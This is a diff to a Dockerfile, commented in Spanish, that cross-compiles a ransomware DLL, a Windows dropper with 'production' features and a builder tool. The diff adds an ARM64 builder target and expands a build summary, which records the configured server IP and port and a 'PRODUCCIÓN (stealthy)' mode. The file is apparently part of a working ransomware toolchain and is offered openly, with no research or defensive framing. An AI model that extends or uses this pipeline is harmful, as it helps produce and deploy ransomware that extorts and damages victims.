@@ -71,14 +71,22 @@ RUN echo "🔨 Compilando ransomware.dll..." && \
     cp target/x86_64-pc-windows-gnu/release/ransomware.dll /build_output/ransomware.dll && \
     echo "✅ Ransomware DLL compilado: /build_output/ransomware.dll"
 
-# 4. Compilar el builder (Linux)
-RUN echo "🔨 Compilando builder..." && \
+# 4a. Compilar el builder (Linux x86_64)
+RUN echo "🔨 Compilando builder (x86_64)..." && \
     cargo build --release --target x86_64-unknown-linux-gnu --package builder && \
     cp target/x86_64-unknown-linux-gnu/release/builder /build_output/builder && \
     chmod +x /build_output/builder && \
-    echo "✅ Builder compilado: /build_output/builder"
+    echo "✅ Builder x86_64 compilado: /build_output/builder"
 
-# 4b. Compilar el dropper (Windows) - con features de producción
+# 4b. Compilar el builder (Linux ARM64)
+RUN echo "🔨 Compilando builder (ARM64)..." && \
+    CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc \
+    cargo build --release --target aarch64-unknown-linux-gnu --package builder && \
+    cp target/aarch64-unknown-linux-gnu/release/builder /build_output/builder-arm64 && \
+    chmod +x /build_output/builder-arm64 && \
+    echo "✅ Builder ARM64 compilado: /build_output/builder-arm64"
+
+# 4c. Compilar el dropper (Windows) - con features de producción
 RUN echo "🔨 Compilando dropper..." && \
     cargo build --release --target x86_64-pc-windows-gnu --package dropper --features production && \
     cp target/x86_64-pc-windows-gnu/release/dropper.exe /build_output/dropper.exe && \
@@ -134,8 +142,14 @@ RUN echo "📦 RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
     echo "  Configurado para: ${SERVER_IP}:${SERVER_PORT}" >> /build_output/BUILD_INFO.txt && \
     echo "  Modo: $(if [ "$PRODUCTION_MODE" = "true" ]; then echo "PRODUCCIÓN (stealthy)"; else echo "DESARROLLO (debug)"; fi)" >> /build_output/BUILD_INFO.txt && \
     echo "" >> /build_output/BUILD_INFO.txt && \
-    echo "Builder:" >> /build_output/BUILD_INFO.txt && \
+    echo "Builder (x86_64):" >> /build_output/BUILD_INFO.txt && \
     ls -lh /build_output/builder >> /build_output/BUILD_INFO.txt && \
+    echo "" >> /build_output/BUILD_INFO.txt && \
+    echo "Builder (ARM64):" >> /build_output/BUILD_INFO.txt && \
+    ls -lh /build_output/builder-arm64 >> /build_output/BUILD_INFO.txt && \
+    echo "" >> /build_output/BUILD_INFO.txt && \
+    echo "Dropper (Windows):" >> /build_output/BUILD_INFO.txt && \
+    ls -lh /build_output/dropper.exe >> /build_output/BUILD_INFO.txt && \
     echo "" >> /build_output/BUILD_INFO.txt && \
     echo "DLLs:" >> /build_output/BUILD_INFO.txt && \
     ls -lh /build_output/*.dll >> /build_output/BUILD_INFO.txt && \
